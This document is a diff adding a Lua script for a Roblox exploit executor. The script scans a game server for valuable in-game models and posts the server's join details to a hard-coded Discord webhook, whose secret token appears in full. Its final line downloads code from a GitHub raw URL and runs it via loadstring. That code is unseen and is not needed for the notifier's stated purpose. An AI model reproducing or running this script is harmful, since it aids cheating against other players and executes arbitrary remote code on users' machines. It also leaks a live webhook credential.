@@ -1,0 +1,120 @@
+getgenv().ALLOWED_PLACE_ID = 109983668079237
+getgenv().RETRY_DELAY = 2
+getgenv().MIN_PLAYERS = 2
+getgenv().MAX_PLAYERS = 7
+getgenv().CHECK_COOLDOWN = 5
+getgenv().SOUND_ID = 91907916191505
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1404917880335761559/jqzrDgVyuGscwDiZw2ELohmKEjX1ovwCel-Q_wbl46YEkZux0uqmyWMdYS3HnzOgvl3h"
+
+getgenv().MODEL_SEARCH_SETTINGS = {
+    ["La Vacca Saturno Saturnita"] = { enabled = true, value = 250000 },
+    ["Karkerkar Kurkur"] = { enabled = true, value = 275000 },
+    ["Chimpanzini Spiderini"] = { enabled = true, value = 325000 },
+    ["Agarrini La Palini"] = { enabled = true, value = 425000 },
+    ["Los Tralaleritos"] = { enabled = true, value = 500000 },
+    ["Las Tralaleritas"] = { enabled = true, value = 650000 },
+    ["Las Vaquitas Saturnitas"] = { enabled = true, value = 750000 },
+    ["Graipuss Medussi"] = { enabled = true, value = 1000000 },
+    ["Lucky Block"] = { enabled = true, value = 1500000 },
+    ["Chicleteira Bicicleteira"] = { enabled = true, value = 3500000 },
+    ["La Grande Combinasion"] = { enabled = true, value = 10000000 },
+    ["Los Combinasionas"] = { enabled = true, value = 15000000 },
+    ["Nuclearo Dinossauro"] = { enabled = true, value = 15000000 },
+    ["Los Hotspotsitos"] = { enabled = true, value = 20000000 },
+    ["Garama and Madundung"] = { enabled = true, value = 50000000 },
+    ["Dragon Cannelloni"] = { enabled = true, value = 100000000 },
+    ["Torrtuginni Dragonfrutini"] = { enabled = true, value = 350000 },
+    ["Pot Hotspot"] = { enabled = true, value = 2500000 },
+    ["Esok Sekolah"] = { enabled = true, value = 30000000 },
+}
+
+local mutationMultipliers = {
+    ["Gold"] = 1.25, ["Diamond"] = 1.50, ["Rainbow"] = 10, ["Lava"] = 6,
+    ["Bloodrot"] = 2, ["Celestial"] = 4, ["Candy"] = 4, ["Raining Tacos"] = 3,
+    ["Tung Tung Attack"] = 4, ["Glitch"] = 5, ["Crab Rave"] = 5, ["Fire"] = 5,
+    ["4th of July"] = 6, ["Nyan Cats"] = 6, ["Concert"] = 5, ["10B Visits"] = 4,
+    ["Rain"] = 4, ["Snow"] = 3, ["Starfall"] = 6
+}
+
+local sent = false
+
+local function formatMoney(v)
+    if v >= 1e9 then
+        return string.format("$%dB/s", v / 1e9)
+    elseif v >= 1e6 then
+        return string.format("$%dM/s", v / 1e6)
+    elseif v >= 1e3 then
+        return string.format("$%dK/s", v / 1e3)
+    else
+        return "$" .. v .. "/s"
+    end
+end
+
+local function getMutationMultiplier(name)
+    for mutation, mult in pairs(mutationMultipliers) do
+        if string.find(name, mutation) then
+            return mult
+        end
+    end
+    return 1
+end
+
+local function sendWebhookMultiple(models)
+    if sent then return end
+    sent = true
+    local namesList = {}
+    local valuesList = {}
+    for _, m in ipairs(models) do
+        table.insert(namesList, m.name)
+        table.insert(valuesList, formatMoney(m.value))
+    end
+    local embed = {
+        title = "🧠 Brainrot Notify | Omxrr’s Hub",
+        color = 3092790,
+        fields = {
+            { name = "🏷 Names", value = table.concat(namesList, ", "), inline = false },
+            { name = "📈 Generation", value = table.concat(valuesList, ", "), inline = false },
+            { name = "👥 Players", value = tostring(#game.Players:GetPlayers()).."/"..tostring(game.Players.MaxPlayers), inline = false },
+            { name = "💻 Job ID (PC)", value = game.JobId, inline = false },
+            { name = "📱 Job ID (Mobile)", value = game.JobId, inline = false },
+            { name = "🔗 Join Link", value = "[Click to Join](https://www.roblox.com/games/start?placeId="..getgenv().ALLOWED_PLACE_ID.."&gameInstanceId="..game.JobId..")", inline = false },
+            { name = "📜 Join Script (PC)", value = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..getgenv().ALLOWED_PLACE_ID..",\""..game.JobId.."\",game.Players.LocalPlayer)", inline = false },
+        },
+        footer = { text = "Made by Omxrr’s Hub • "..os.date("%d/%m/%Y %H:%M") }
+    }
+    http_request({
+        Url = getgenv().WEBHOOK_URL,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = game:GetService("HttpService"):JSONEncode({
+            content = "@everyone",
+            embeds = {embed}
+        })
+    })
+end
+
+local function checkForModels()
+    local foundModels = {}
+    for modelName, settings in pairs(getgenv().MODEL_SEARCH_SETTINGS) do
+        if settings.enabled then
+            local found = workspace:FindFirstChild(modelName, true)
+            if found then
+                local value = settings.value * getMutationMultiplier(found.Name)
+                table.insert(foundModels, { name = found.Name, value = value })
+            end
+        end
+    end
+    if #foundModels > 0 then
+        sendWebhookMultiple(foundModels)
+    end
+end
+
+task.spawn(function()
+    while task.wait(getgenv().CHECK_COOLDOWN) do
+        if not sent then
+            checkForModels()
+        end
+    end
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/keyless/refs/heads/main/keyless"))()
